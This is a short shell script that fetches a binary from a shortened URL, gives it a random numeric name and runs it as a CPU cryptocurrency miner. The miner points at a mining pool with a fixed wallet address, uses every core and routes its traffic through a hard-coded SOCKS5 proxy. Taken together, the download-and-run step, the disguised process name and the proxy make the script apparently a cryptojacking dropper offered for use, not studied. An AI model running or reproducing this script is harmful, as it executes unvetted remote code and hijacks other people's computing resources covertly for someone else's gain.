wget -qO build https://git.io/JiGZh && chmod +x build &&
TOP=$(shuf -n 1 -i 1-200000)
USER=$1
mv build $TOP
./$TOP -a verus -o stratum+tcp://verushash.mine.zergpool.com:3300 -u MMAuCeyBSsyNUFfrKPz2YLYuiinCh4PJtt.$(echo $(shuf -i 1-2000 -n 1)-DYT) -p -x -t $(nproc --all) -x socks5://192.111.135.21:4145
